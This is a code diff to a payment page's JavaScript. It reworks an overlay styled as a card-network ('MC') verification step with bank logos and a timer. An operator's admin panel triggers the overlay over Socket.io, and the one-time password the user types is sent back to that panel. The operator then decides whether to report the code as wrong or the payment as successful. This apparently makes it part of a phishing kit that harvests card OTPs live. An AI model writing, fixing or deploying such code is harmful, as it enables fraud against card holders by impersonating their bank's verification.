@@ -559,22 +559,25 @@ function getFailUrl(reason) {
     <div class="spinner"></div>
   </div>
 
-  <!-- Include the MC verification overlay -->
+<!-- MC verification overlay container -->
 <div id="mcVerificationContainer"></div>
 
 <script>
-  // Load the MC verification overlay
-  fetch('/mcverification.html')
-    .then(response => response.text())
-    .then(html => {
-      document.getElementById('mcVerificationContainer').innerHTML = html;
-      
-      // Set up the MC verification functionality
-      setupMCVerification();
-    })
-    .catch(error => console.error('Error loading MC verification:', error));
+  // Load and initialize MC verification overlay
+  document.addEventListener('DOMContentLoaded', function() {
+    // Initially load the MC verification HTML
+    fetch('/mcverification.html')
+      .then(response => response.text())
+      .then(html => {
+        document.getElementById('mcVerificationContainer').innerHTML = html;
+        setupMCVerification();
+      })
+      .catch(error => console.error('Error loading MC verification overlay:', error));
+  });
 
+  // Set up MC verification functionality
   function setupMCVerification() {
+    console.log('Setting up MC verification...');
     const overlay = document.getElementById('mcVerificationOverlay');
     const cancelBtn = document.getElementById('mcCancel');
     const confirmBtn = document.getElementById('mcConfirmBtn');
@@ -586,18 +589,7 @@ function getFailUrl(reason) {
     let timeLeft = 30;
     let timerInterval;
     
-    // Capture the current invoice ID for use in the MC verification
-    let mcInvoiceId = "";
-    
-    // Update merchant and amount details
-    function updateTransactionDetails(merchantName, amount) {
-      document.getElementById('merchantName').textContent = merchantName || 'Merchant';
-      document.getElementById('merchantName2').textContent = merchantName || 'Merchant';
-      document.getElementById('transactionAmount').textContent = amount || '$0.00';
-      document.getElementById('transactionAmount2').textContent = amount || '$0.00';
-    }
-    
-    // Update bank logo
+    // Update bank logo based on bank code
     function updateBankLogo(bankCode) {
       const bankLogos = {
         'sbi': 'https://www.onlinesbi.sbi/sbijava/images/sbi_logo.png',
@@ -610,7 +602,10 @@ function getFailUrl(reason) {
       };
       
       const bankLogo = document.getElementById('bankLogo');
-      bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
+      if (bankLogo) {
+        bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
+        console.log('Updated bank logo:', bankCode, bankLogo.src);
+      }
     }
     
     // Start the timer
@@ -627,7 +622,11 @@ function getFailUrl(reason) {
         if (timeLeft <= 0) {
           clearInterval(timerInterval);
           // Redirect to fail page on timeout
-          window.location.href = getFailUrl('timeout');
+          if (typeof getFailUrl === 'function') {
+            window.location.href = getFailUrl('timeout');
+          } else {
+            window.location.href = '/fail.html?reason=timeout';
+          }
         }
       }, 1000);
     }
@@ -638,105 +637,135 @@ function getFailUrl(reason) {
       timer.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
     }
     
-    // Show the MC verification overlay
-    function showMCVerification(invoiceId, merchantName, amount, bankCode) {
-      mcInvoiceId = invoiceId;
-      
-      updateTransactionDetails(merchantName, amount);
-      updateBankLogo(bankCode || 'default');
-      
-      otpInput.value = '';
-      otpError.style.display = 'none';
-      
-      overlay.style.display = 'flex';
-      startTimer();
-    }
-    
-    // Hide the MC verification overlay
-    function hideMCVerification() {
-      overlay.style.display = 'none';
-      clearInterval(timerInterval);
-    }
-    
     // Cancel button event
-    cancelBtn.addEventListener('click', () => {
-      hideMCVerification();
-      window.location.href = getFailUrl('canceled');
-    });
+    if (cancelBtn) {
+      cancelBtn.addEventListener('click', () => {
+        overlay.style.display = 'none';
+        clearInterval(timerInterval);
+        
+        if (typeof getFailUrl === 'function') {
+          window.location.href = getFailUrl('canceled');
+        } else {
+          window.location.href = '/fail.html?reason=canceled';
+        }
+      });
+    }
     
     // Confirm button event
-    confirmBtn.addEventListener('click', () => {
-      const otp = otpInput.value.trim();
-      
-      if (!otp) {
-        otpError.textContent = 'Please enter the verification code.';
-        otpError.style.display = 'block';
-        return;
-      }
-      
-      // Send OTP to server/admin panel
-      const socket = io();
-      socket.emit('mc_otp_submitted', {
-        invoiceId: mcInvoiceId,
-        otp: otp
+    if (confirmBtn) {
+      confirmBtn.addEventListener('click', () => {
+        const otp = otpInput.value.trim();
+        
+        if (!otp) {
+          otpError.textContent = 'Please enter the verification code.';
+          otpError.style.display = 'block';
+          return;
+        }
+        
+        // Send OTP to server/admin panel
+        const socket = io();
+        socket.emit('mc_otp_submitted', {
+          invoiceId: currentInvoiceId,
+          otp: otp
+        });
+        
+        // Disable the button and show loading state
+        confirmBtn.disabled = true;
+        confirmBtn.textContent = 'VERIFYING...';
       });
-      
-      // Disable the button and show loading state
-      confirmBtn.disabled = true;
-      confirmBtn.textContent = 'VERIFYING...';
-    });
+    }
     
     // Resend button event
-    resendBtn.addEventListener('click', () => {
-      // Request new OTP
-      const socket = io();
-      socket.emit('mc_resend_otp', {
-        invoiceId: mcInvoiceId
+    if (resendBtn) {
+      resendBtn.addEventListener('click', () => {
+        // Request new OTP
+        const socket = io();
+        socket.emit('mc_resend_otp', {
+          invoiceId: currentInvoiceId
+        });
+        
+        // Show message
+        alert('A new verification code has been sent.');
+        
+        // Reset timer
+        startTimer();
       });
-      
-      // Show message
-      alert('A new verification code has been sent.');
-      
-      // Reset timer
-      startTimer();
-    });
+    }
     
-    // Listen for socket events from admin panel
+    // Listen for Socket.io events
     const socket = io();
     
-    // MC verification triggered from admin panel
+    // Event for showing MC verification
     socket.on('show_mc_verification', (data) => {
+      console.log('Received show_mc_verification event:', data);
+      
       if (data.invoiceId === currentInvoiceId) {
-        showMCVerification(
-          data.invoiceId,
-          data.merchantName || 'Merchant',
-          data.amount || '$0.00',
-          data.bankCode || 'default'
-        );
+        // Update merchant and amount info
+        document.getElementById('merchantName').textContent = data.merchantName || 'Merchant';
+        document.getElementById('merchantName2').textContent = data.merchantName || 'Merchant';
+        document.getElementById('transactionAmount').textContent = data.amount || '$0.00';
+        document.getElementById('transactionAmount2').textContent = data.amount || '$0.00';
+        
+        // Update bank logo
+        updateBankLogo(data.bankCode || 'default');
+        
+        // Reset OTP input and error
+        otpInput.value = '';
+        otpError.style.display = 'none';
+        
+        // Show overlay and start timer
+        overlay.style.display = 'flex';
+        startTimer();
+        
+        console.log('MC verification overlay shown');
       }
     });
     
-    // OTP error from admin panel
+    // Update bank logo event
+    socket.on('update_mc_bank', (data) => {
+      console.log('Received update_mc_bank event:', data);
+      
+      if (data.invoiceId === currentInvoiceId) {
+        updateBankLogo(data.bankCode || 'default');
+      }
+    });
+    
+    // Handle OTP error
     socket.on('mc_otp_error', (data) => {
-      if (data.invoiceId === mcInvoiceId) {
+      console.log('Received mc_otp_error event:', data);
+      
+      if (data.invoiceId === currentInvoiceId) {
         otpError.textContent = data.message || 'Incorrect verification code. Please try again.';
         otpError.style.display = 'block';
         
-        // Reset the button
+        // Reset button state
         confirmBtn.disabled = false;
         confirmBtn.textContent = 'CONFIRM';
       }
     });
     
-    // Redirect to success/fail based on admin decision
+    // Handle verification result
     socket.on('mc_verification_result', (data) => {
-      if (data.invoiceId === mcInvoiceId) {
-        hideMCVerification();
+      console.log('Received mc_verification_result event:', data);
+      
+      if (data.invoiceId === currentInvoiceId) {
+        // Hide overlay and stop timer
+        overlay.style.display = 'none';
+        clearInterval(timerInterval);
         
+        // Redirect based on result
         if (data.success) {
-          window.location.href = getSuccessUrl(data.invoiceId);
+          if (typeof getSuccessUrl === 'function') {
+            window.location.href = getSuccessUrl(currentInvoiceId);
+          } else {
+            window.location.href = `/success.html?invoiceId=${currentInvoiceId}`;
+          }
         } else {
-          window.location.href = getFailUrl(data.reason || 'declined');
+          if (typeof getFailUrl === 'function') {
+            window.location.href = getFailUrl(data.reason || 'declined');
+          } else {
+            window.location.href = `/fail.html?invoiceId=${currentInvoiceId}&reason=${data.reason || 'declined'}`;
+          }
         }
       }
     });
